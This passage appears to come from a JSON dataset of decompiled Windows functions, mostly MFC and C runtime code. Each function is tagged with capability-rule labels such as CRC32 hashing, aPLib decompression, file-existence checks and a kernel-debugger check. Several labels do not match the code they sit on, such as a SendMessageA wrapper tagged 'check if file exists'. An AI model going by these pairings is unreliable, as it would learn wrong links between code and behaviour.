= false;\n    }\n    goto code_r0x0042aa14;\n}\n",
        "token_count": 791
    },
    "0042ab0a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool __cdecl fcn.0042ab0a(uint32_t arg_8h)\n\n{\n    uint noname_8;\n    uint noname_11;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    bool bVar4;\n    uint *noname_0;\n    uint32_t var_34h;\n    uint var_30h;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00431a51();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.0041cc60(&var_34h, 0, 0x28);\n        var_30h = _sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.00431a51();\n        noname_11 = *0x449360;\n        noname_8 = *(iVar1 + 8);\n        noname_0 = 0x8;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            noname_0 = &var_34h;\n            var_34h = 0xb;\n            iVar1 = fcn.00429b65(noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0xb, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, *0x449360, var_18h, in_stack_ffffffe8, \n                                 \"AfxWnd70s\", 8, var_8h, var_4h, unaff_EBP);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            iVar1 = fcn.00429b65(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, var_34h, var_30h, \n                                 in_stack_ffffffd0, in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, var_18h, \n                                 in_stack_ffffffe8, \"AfxOleControl70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            iVar1 = fcn.00429b65(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, 0x10, in_stack_ffffffe8, \n                                 \"AfxControlBar70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            iVar1 = fcn.0042aac9(&var_34h, \"AfxMDIFrame70s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            iVar1 = fcn.0042aac9(&var_34h, \"AfxFrameOrView70s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0042a427(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0042a427(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0042a427(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0042a427(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0042a427(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0042a427(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0042a427(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0042a427(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0042a427(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0042a427(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0042a427(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0042a427(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0042a427(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x40000) != 0) {\n            var_8h = 0x8000;\n            uVar2 = fcn.0042a427(&var_ch, 0x40000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n            uVar3 = uVar3 | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 2260
    },
    "0042cded": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042cded(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 0x39) & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageA)(*(param_1 + 0x1c), param_2);\n    }\n    else {\n        iVar1 = fcn.00431a51();\n        (**(**(iVar1 + 0x1038) + 0x24))(param_1, param_2);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "0042f6d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f6d4(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(param_1 + 0x28);\n    if ((*(param_1 + 0x18) & 1) == 0) {\n        piVar1 = param_1 + 0x30;\n        iVar2 = *piVar1;\n        if (*(param_1 + 8) == 0) {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x38))(iVar2, iVar3 - iVar2);\n            }\n        }\n        else {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x50))(2, iVar3 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x24) + 0x50))(1, *(param_1 + 0x20), piVar1, param_1 + 0x2c);\n        }\n        iVar3 = *piVar1;\n    }\n    else {\n        if (*(param_1 + 0x2c) != iVar3) {\n            iVar3 = iVar3 - *(param_1 + 0x2c);\n            (**(**(param_1 + 0x24) + 0x28))(iVar3, iVar3 >> 0x1f, 1);\n        }\n        iVar3 = *(param_1 + 0x2c);\n    }\n    *(param_1 + 0x28) = iVar3;\n    return;\n}\n",
        "token_count": 378
    },
    "0042f992": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.0042f992(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00401400();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 == NULL) {\n        fcn.004275b6();\n    }\n    uVar2 = (**(*piVar1 + 0x18))(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 1;\n    fcn.004019f0(uVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.004011b0();\n    uVar2 = *(unaff_EBP + 0xc);\n    extraout_ECX[4] = 0xffffffff;\n    extraout_ECX[6] = uVar2;\n    extraout_ECX[1] = 1;\n    extraout_ECX[7] = 1;\n    extraout_ECX[9] = piVar1;\n    extraout_ECX[0x10] = (-((~uVar2 & 1) != 0) & 0xffffffd0) + 0x40;\n    uVar2 = *(unaff_EBP + 0x14);\n    extraout_ECX[0xf] = 0;\n    extraout_ECX[0xe] = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[0x11] = 0x89;\n    extraout_ECX[0xc] = uVar2;\n    extraout_ECX[2] = 0;\n    uVar3 = (**(*piVar1 + 0x50))(3, 0, 0, 0);\n    iVar5 = *(unaff_EBP + 0x10);\n    extraout_ECX[3] = uVar3 & 2;\n    if (iVar5 < 0x80) {\n        extraout_ECX[8] = 0x80;\n        extraout_ECX[0xc] = 0;\n    }\n    else {\n        extraout_ECX[8] = iVar5;\n    }\n    iVar5 = extraout_ECX[8];\n    if (extraout_ECX[0xc] == 0) {\n        uVar3 = (**(*extraout_ECX[9] + 0x50))(3, 0, 0, 0);\n        extraout_ECX[2] = uVar3 & 1;\n        if ((uVar3 & 1) == 0) {\n            uVar2 = fcn.00428fb1(extraout_ECX[8]);\n            extraout_ECX[0xc] = uVar2;\n            extraout_ECX[7] = 0;\n        }\n        else {\n            iVar5 = 0;\n        }\n    }\n    iVar5 = extraout_ECX[0xc] + iVar5;\n    extraout_ECX[0xb] = iVar5;\n    iVar4 = extraout_ECX[0xc];\n    if ((*(extraout_ECX + 6) & 1) != 0) {\n        iVar4 = iVar5;\n    }\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[10] = iVar4;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 912
    },
    "0043249d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043249d(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint hMem;\n    uint lpCriticalSection;\n    \n    iVar4 = param_1 + 0x1c;\n    iStack32 = 0x4324b4;\n    iStack28 = iVar4;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar2 = *(param_1 + 4);\n    iVar7 = *(param_1 + 8);\n    if ((iVar2 <= iVar7) || ((*(*(param_1 + 0x10) + iVar7 * 8) & 1) != 0)) {\n        iVar7 = 1;\n        if (1 < iVar2) {\n            puVar6 = *(param_1 + 0x10);\n            do {\n                puVar6 = puVar6 + 8;\n                if ((*puVar6 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar2);\n            if (iVar7 < iVar2) goto code_r0x0043257f;\n        }\n        iVar2 = iVar2 + 0x20;\n        iStack32 = *(param_1 + 0x10);\n        if (iStack32 == 0) {\n            iStack32 = iVar2 * 8;\n            uStack36 = 2;\n            iStack40 = 0x432505;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        }\n        else {\n            uStack36 = 0x43250e;\n            uStack48 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n            iStack40 = 0x432518;\n            uStack36 = uStack48;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n            iStack40 = 0x2002;\n            puStack44 = iVar2 * 8;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n        }\n        if (iStack40 == 0) {\n            iStack40 = *(param_1 + 0x10);\n            if (iStack40 != 0) {\n                puStack44 = 0x43253e;\n                puStack44 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                uStack48 = 0x432545;\n                (*_sym.imp.KERNEL32.dll_GlobalLock)();\n            }\n            puStack44 = 0x43254e;\n            iStack40 = iVar4;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            uStack48 = 0x447678;\n            puStack44 = &stack0xfffffffc;\n            fcn.0041c011(&stack0xffffffd0, 0x43f418);\n            pcVar3 = swi(3);\n            iVar4 = (*pcVar3)();\n            return iVar4;\n        }\n        puStack44 = 0x43255a;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iStack32 = (iVar2 - *(param_1 + 4)) * 8;\n        iStack40 = iVar5 + *(param_1 + 4) * 8;\n        uStack36 = 0;\n        puStack44 = 0x432573;\n        fcn.0041cc60();\n        *(param_1 + 4) = iVar2;\n        *(param_1 + 0x10) = iVar5;\n    }\ncode_r0x0043257f:\n    if (*(param_1 + 0xc) <= iVar7) {\n        *(param_1 + 0xc) = iVar7 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar7 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar7 + 1;\n    uStack36 = 0x4325a2;\n    iStack32 = iVar4;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    return iVar7;\n}\n",
        "token_count": 984
    },
    "004112a0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004112a0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    ulong uVar7;\n    int32_t var_8h;\n    uint32_t var_ch;\n    uint var_10h_2;\n    uint var_10h;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_18h;\n    uint var_14h;\n    uchar *puStack20;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x435a18;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    puStack20 = &stack0xffffffc8;\n    fcn.00410860();\n    iVar4 = *(in_ECX + 4);\n    iVar6 = 0;\n    var_4h = 0;\n    if (iVar4 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(in_ECX + 0xc) - iVar4 >> 4;\n    }\n    uVar7 = CONCAT44(iVar4, iVar2);\n    if (var_ch != 0) {\n        if (iVar4 != 0) {\n            iVar6 = *(in_ECX + 8) - iVar4 >> 4;\n        }\n        if (0xfffffffU - iVar6 < var_ch) {\n            uVar7 = fcn.00411070();\n        }\n        iVar4 = uVar7 >> 0x20;\n        uVar3 = uVar7;\n        if (iVar4 == 0) {\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = *(in_ECX + 8) - iVar4 >> 4;\n        }\n        if (uVar3 < iVar6 + var_ch) {\n            if (0xfffffff - (uVar3 >> 1) < uVar3) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = uVar3 + (uVar3 >> 1);\n            }\n            if (iVar4 == 0) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = *(in_ECX + 8) - iVar4 >> 4;\n            }\n            if (uVar3 < iVar6 + var_ch) {\n                if (iVar4 == 0) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = *(in_ECX + 8) - iVar4 >> 4;\n                }\n                uVar3 = iVar4 + var_ch;\n            }\n            iVar4 = uVar3 * 0x10;\n            iVar6 = fcn.00428fb1();\n            var_4h = CONCAT31(var_4h._1_3_, 1);\n            var_18h = iVar6;\n            iVar4 = fcn.004109e0(*(in_ECX + 4), var_8h, iVar6, in_ECX, var_8h, iVar4, var_10h_2, unaff_EDI, unaff_ESI, \n                                 unaff_EBX, var_28h);\n            fcn.00410eb0(iVar4, var_ch, &var_28h, in_ECX, var_8h, var_10h_2, unaff_EDI, unaff_ESI, unaff_EBX, var_28h);\n            fcn.004109e0(var_8h, *(in_ECX + 8), iVar4 + var_ch * 0x10, in_ECX, var_8h, var_10h_2, unaff_EDI, unaff_ESI, \n                         unaff_EBX, var_28h, var_24h);\n            iVar4 = *(in_ECX + 4);\n            if (iVar4 == 0) {\n                iVar2 = 0;\n            }\n            else {\n                iVar2 = *(in_ECX + 8) - iVar4 >> 4;\n            }\n            if (iVar4 != 0) {\n                fcn.00404620(iVar4, *(in_ECX + 8));\n                fcn.00428fdc(*(in_ECX + 4));\n            }\n            *(in_ECX + 0xc) = uVar3 * 0x10 + iVar6;\n            *(in_ECX + 8) = (var_ch + iVar2) * 0x10 + iVar6;\n            *(in_ECX + 4) = iVar6;\n        }\n        else {\n            var_18h = *(in_ECX + 8);\n            if (var_18h - var_8h >> 4 < var_ch) {\n                fcn.004109e0(var_8h, var_18h, var_ch * 0x10 + var_8h, in_ECX, var_8h, var_10h_2, unaff_EDI, unaff_ESI, \n                             unaff_EBX, var_28h, var_24h);\n                var_4h = CONCAT31(var_4h._1_3_, 3);\n                fcn.00411270(*(in_ECX + 8), var_ch - (*(in_ECX + 8) - var_8h >> 4), &var_28h);\n                iVar4 = *(in_ECX + 8) + var_ch * 0x10;\n                *(in_ECX + 8) = iVar4;\n                var_4h = 0;\n                fcn.00411170(var_8h, iVar4 + var_ch * -0x10, &var_28h);\n            }\n            else {\n                iVar4 = var_18h + var_ch * -0x10;\n                uVar5 = fcn.004109e0(iVar4, var_18h, var_18h, in_ECX, var_8h, var_10h_2, unaff_EDI, unaff_ESI, unaff_EBX\n                                     , var_28h, var_24h);\n                *(in_ECX + 8) = uVar5;\n                fcn.00410f70(var_8h, iVar4, var_18h, var_8h);\n                fcn.00411170(var_8h, var_ch * 0x10 + var_8h, &var_28h);\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    piVar1 = var_24h + -4;\n    LOCK();\n    iVar4 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar4 + -1 < 1) {\n        (**(**(var_24h + -0x10) + 4))(var_24h + -0x10);\n    }\n    piVar1 = var_28h + -4;\n    LOCK();\n    iVar4 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar4 == 1 || iVar4 + -1 < 0) {\n        (**(**(var_28h + -0x10) + 4))(var_28h + -0x10);\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 1826
    },
    "0041d9f7": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * fcn.0041d9f7(uint *param_1, int16_t *param_2, int32_t param_3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    puVar4 = param_1;\n    if (param_3 != 0) {\n        do {\n            iVar1 = *param_2;\n            *puVar4 = iVar1;\n            puVar4 = puVar4 + 2;\n            param_2 = param_2 + 1;\n            if (iVar1 == 0) break;\n            param_3 = param_3 + -1;\n        } while (param_3 != 0);\n        if ((param_3 != 0) && (uVar2 = param_3 - 1,  uVar2 != 0)) {\n            for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            for (uVar2 = (uVar2 & 1) != 0; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 2;\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 324
    },
    "00411955": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00411955(int32_t *param_1, int32_t param_2)\n\n{\n    if ((param_2 == -1) && (param_2 = *param_1,  param_2 != 0)) {\n        param_2 = fcn.0041c6f0(param_2);\n    }\n    fcn.004011d0(param_2);\n    return;\n}\n",
        "token_count": 93
    },
    "00413751": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00413751(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    puVar1 = (**(*arg_8h + 0x3c))();\n    do {\n        if (puVar1 == NULL) {\n            return 0;\n        }\n        iVar2 = puVar1[1];\n        uVar3 = *(iVar2 + 0x18);\n        if (uVar3 != 0xffffffff) {\n            do {\n                if ((*(iVar2 + 4) == arg_10h[1]) && (uVar3 == (*arg_10h != 0))) {\n                    if (*(iVar2 + 0x24) == 0xffffffff) {\n                        if (*(iVar2 + 0x20) == 0xffffffff) {\n                            return iVar2;\n                        }\n                        if (*(iVar2 + 0x20) == arg_ch) {\n                            return iVar2;\n                        }\n                    }\n                    else if ((*(iVar2 + 0x20) < arg_ch || *(iVar2 + 0x20) == arg_ch) && (arg_ch <= *(iVar2 + 0x24))) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = *(iVar2 + 0x40);\n                iVar2 = iVar2 + 0x28;\n            } while (uVar3 != 0xffffffff);\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 349
    },
    "0041ad26": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041ad26(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *in_ECX;\n    int64_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_4h;\n    \n    var_24h = arg_1ch;\n    var_20h = arg_18h;\n    var_1ch = arg_14h;\n    var_18h = arg_10h;\n    var_14h = arg_ch + -1;\n    var_10h = arg_8h + -0x76c;\n    var_4h = arg_20h;\n    iVar1 = fcn.0041dd09(&var_24h);\n    *in_ECX = iVar1;\n    in_ECX[1] = iVar1 >> 0x20;\n    if (iVar1 == -1) {\n        fcn.004010f0(0x80070057);\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "0041bbcc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0041bbcc(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.0041fe19(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.0041b808(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.0041b84a(param_2, iVar5);\n                        fcn.0041b8de(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.0041b84a(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 516
    },
    "004247e3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004247e3(uint8_t **param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    puVar3 = param_1[3];\n    if (((puVar3 & 0x83) != 0) && ((puVar3 & 0x40) == 0)) {\n        if ((puVar3 & 2) == 0) {\n            param_1[3] = puVar3 | 1;\n            if ((puVar3 & 0x10c) == 0) {\n                fcn.00424239(param_1);\n            }\n            else {\n                *param_1 = param_1[2];\n            }\n            puVar3 = fcn.00425ab0(param_1[4], param_1[2], param_1[6]);\n            param_1[1] = puVar3;\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((param_1[3] & 0x82) == 0) {\n                    puVar2 = param_1[4];\n                    if (puVar2 == 0xffffffff) {\n                        iVar4 = 0x444720;\n                    }\n                    else {\n                        iVar4 = *((puVar2 >> 5) * 4 + 0x44aba0) + (puVar2 & 0x1f) * 0x24;\n                    }\n                    if ((*(iVar4 + 4) & 0x82) == 0x82) {\n                        param_1[3] = param_1[3] | 0x2000;\n                    }\n                }\n                if (((param_1[6] == 0x200) && ((param_1[3] & 8) != 0)) && ((param_1[3] & 0x400) == 0)) {\n                    param_1[6] = 0x1000;\n                }\n                param_1[1] = puVar3 + -1;\n                uVar1 = **param_1;\n                *param_1 = *param_1 + 1;\n                return uVar1;\n            }\n            param_1[3] = param_1[3] | (-(puVar3 != NULL) & 0x10) + 0x10;\n            param_1[1] = NULL;\n        }\n        else {\n            param_1[3] = puVar3 | 0x20;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 577
    },
    "004276cb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004276cb(uint wParam, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_ECX;\n    uint32_t lParam;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    \n    var_14h = arg_ch;\n    var_1ch = arg_10h;\n    lParam = 5;\n    if (arg_14h != -1) {\n        lParam = 7;\n        var_18h = arg_14h;\n    }\n    if (arg_18h != -1) {\n        lParam = lParam | 8;\n        var_ch = arg_18h;\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x101b, wParam, &lParam);\n    return;\n}\n",
        "token_count": 212
    },
    "00427fde": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
